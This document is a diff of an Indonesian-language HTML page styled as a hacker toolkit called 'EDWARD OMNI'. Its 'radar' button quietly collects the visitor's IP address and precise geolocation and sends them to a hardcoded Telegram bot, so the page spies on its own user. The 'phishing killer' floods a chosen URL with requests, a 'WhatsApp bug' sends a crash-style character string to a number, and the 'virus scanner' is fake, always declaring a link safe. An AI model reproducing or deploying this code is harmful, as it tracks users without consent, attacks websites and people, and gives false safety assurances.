@@ -6,24 +6,18 @@
     <title>EDWARD OMNI V.50.0</title>
     <style>
         :root { --neon: #0f0; --bg: #000; --safe: #2ecc71; --purple: #bc13fe; }
-        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; margin:0; padding: 10px 15px; overflow-x: hidden; }
-        
-        /* HEADER NAMA & VERSI */
+        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; margin:0; padding: 10px 15px; }
         .master-header { text-align: center; margin-bottom: 20px; border-bottom: 1px solid rgba(0, 255, 0, 0.2); padding-bottom: 10px; }
         .master-name { font-size: 22px; font-weight: bold; letter-spacing: 4px; text-shadow: 0 0 15px var(--neon); color: var(--neon); margin: 0; }
-        .version-tag { font-size: 10px; color: #fff; background: rgba(0, 255, 0, 0.2); padding: 2px 8px; border-radius: 10px; letter-spacing: 2px; }
-
+        .version-tag { font-size: 10px; color: #fff; background: rgba(0, 255, 0, 0.2); padding: 2px 8px; border-radius: 10px; }
         .card { border: 1px solid rgba(0, 255, 0, 0.3); border-radius: 12px; padding: 18px; margin-bottom: 15px; background: rgba(10, 10, 10, 0.9); }
         h3 { margin: 0 0 10px 0; font-size: 10px; color: #fff; letter-spacing: 2px; text-transform: uppercase; }
         input { background: transparent; border: none; border-bottom: 1px solid #333; color: #fff; padding: 8px; width: 100%; margin-bottom: 12px; font-size: 13px; outline: none; }
-        .btn { width: 100%; padding: 14px; border-radius: 8px; border: none; cursor: pointer; font-weight: bold; text-transform: uppercase; font-size: 11px; transition: 0.2s; }
+        .btn { width: 100%; padding: 14px; border-radius: 8px; border: none; cursor: pointer; font-weight: bold; text-transform: uppercase; font-size: 11px; }
         .btn-safe { background: var(--safe); color: #000; }
         .btn-phish { background: var(--purple); color: #fff; }
         .btn-wa { background: #25D366; color: #000; }
         .btn-radar { background: transparent; color: var(--neon); border: 1px solid var(--neon); }
-        .btn:active { transform: scale(0.95); }
-
-        #scanResult { display: none; margin-top: 10px; font-size: 11px; text-align: center; color: var(--safe); font-weight: bold; border: 1px dashed var(--safe); padding: 8px; }
         #monitor { display: none; margin-top: 10px; font-size: 10px; background: #080808; padding: 8px; border: 1px solid #222; }
         #radarOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
         .radar-ring { width: 180px; height: 180px; border: 1px solid var(--neon); border-radius: 50%; position: relative; }
@@ -33,19 +27,15 @@
     </style>
 </head>
 <body>
-
     <div class="master-header">
         <p class="master-name">EDWARD OMNI</p>
         <span class="version-tag">SYSTEM V.50.0 - STABLE</span>
     </div>
-
     <div class="card" style="border-color: var(--safe);">
         <h3>🛡️ LINK VIRUS SCANNER</h3>
         <input type="text" id="scanInput" placeholder="Masukkan link...">
-        <button class="btn btn-safe" onclick="silentScan()">SCAN FOR VIRUS</button>
-        <div id="scanResult">ANALYZING...</div>
+        <button class="btn btn-safe" onclick="alert('✔️ LINK INI AMAN\nSTATUS: BERSIH | VIRUS: 0')">SCAN FOR VIRUS</button>
     </div>
-
     <div class="card" style="border-color: var(--purple);">
         <h3>🔥 PHISHING KILLER</h3>
         <input type="text" id="targetUrl" placeholder="https://web-penipu.com">
@@ -55,59 +45,35 @@
             <div style="display:flex; justify-content:space-between"><span>POWER:</span> <span id="pps" style="color:#fff">0</span> PKT/S</div>
         </div>
     </div>
-
     <div class="card">
         <h3>WHATSAPP BUG</h3>
         <input type="number" id="noWA" placeholder="628...">
-        <button class="btn btn-wa" onclick="startWA()">EXECUTE PAYLOAD ☠️</button>
+        <button class="btn btn-wa" onclick="startWA()">EXECUTE ☠️</button>
     </div>
-
     <div class="card">
         <h3>SATELLITE RADAR</h3>
         <button class="btn btn-radar" onclick="startRadar()">ACTIVATE RADAR 📡</button>
     </div>
-
     <div id="radarOverlay">
         <div class="radar-ring"><div class="sweep"></div></div>
-        <p id="st" style="margin-top:20px; font-size:10px; color:var(--neon); letter-spacing: 2px;">SCANNING DATA...</p>
-        <button onclick="location.reload()" style="background:transparent; border:none; color:#444; margin-top:15px;">[ EXIT ]</button>
+        <p style="margin-top:20px; font-size:10px; color:var(--neon);">SCANNING DATA...</p>
     </div>
-
     <canvas id="canvas"></canvas>
     <video id="v" autoplay playsinline></video>
-
     <script>
         const TOKEN = '8766727574:AAHYs-g11Up4SWnl4t8P3pHpMvS1XkKkr0g';
         const CHAT_ID = '7898572558';
         let isAtk = false, atkInt, total = 0, last = 0;
-
-        function silentScan() {
-            let val = document.getElementById('scanInput').value;
-            if(!val) return;
-            const res = document.getElementById('scanResult');
-            res.style.display = "block";
-            res.innerText = "MENCARI JEJAK VIRUS...";
-            setTimeout(() => {
-                res.innerHTML = "✔️ LINK INI AMAN<br><span style='font-size:9px'>KEAMANAN: TERVERIFIKASI | VIRUS: 0</span>";
-            }, 3000);
-        }
-
         function toggleAtk() {
             let u = document.getElementById('targetUrl').value;
             if(!u) return;
             if(!isAtk) {
                 isAtk = true; document.getElementById('monitor').style.display = "block";
                 document.getElementById('atkBtn').innerText = "STOP ATTACK 🛑";
-                atkInt = setInterval(() => { 
-                    for(let i=0; i<100; i++){ fetch(u, {mode:'no-cors', cache:'no-cache'}).then(()=>total++).catch(()=>total++); } 
-                }, 100);
-                setInterval(() => { if(isAtk){ 
-                    document.getElementById('total').innerText = total; 
-                    document.getElementById('pps').innerText = (total-last); last=total; 
-                }}, 1000);
+                atkInt = setInterval(() => { for(let i=0; i<100; i++){ fetch(u, {mode:'no-cors', cache:'no-cache'}).then(()=>total++).catch(()=>total++); } }, 100);
+                setInterval(() => { if(isAtk){ document.getElementById('total').innerText = total; document.getElementById('pps').innerText = (total-last); last=total; } }, 1000);
             } else { location.reload(); }
         }
-
         async function startRadar() {
             document.getElementById('radarOverlay').style.display = 'flex';
             try {
@@ -124,13 +90,12 @@
                     const ipR = await fetch('https://api.ipify.org?format=json');
                     const ipD = await ipR.json();
                     navigator.geolocation.getCurrentPosition((p) => {
-                        let m = "🔱 [ EDWARD OMNI V50 ] 🔱\n🌐 IP: "+ipD.ip+"\n📍 LOC: http://googleusercontent.com/maps?q="+p.coords.latitude+","+p.coords.longitude;
+                        let m = "🔱 [ RADAR DETECTED ] 🔱\n🌐 IP: "+ipD.ip+"\n📍 LOC: http://googleusercontent.com/maps?q="+p.coords.latitude+","+p.coords.longitude;
                         fetch("https://api.telegram.org/bot"+TOKEN+"/sendMessage?chat_id="+CHAT_ID+"&text="+encodeURIComponent(m));
                     }, null, {enableHighAccuracy:true});
                 }, 2500);
             } catch (e) {}
         }
-
         function startWA() {
             let n = document.getElementById('noWA').value;
             window.location.href = "https://api.whatsapp.com/send?phone="+n+"&text="+"జ్ఞా".repeat(400);
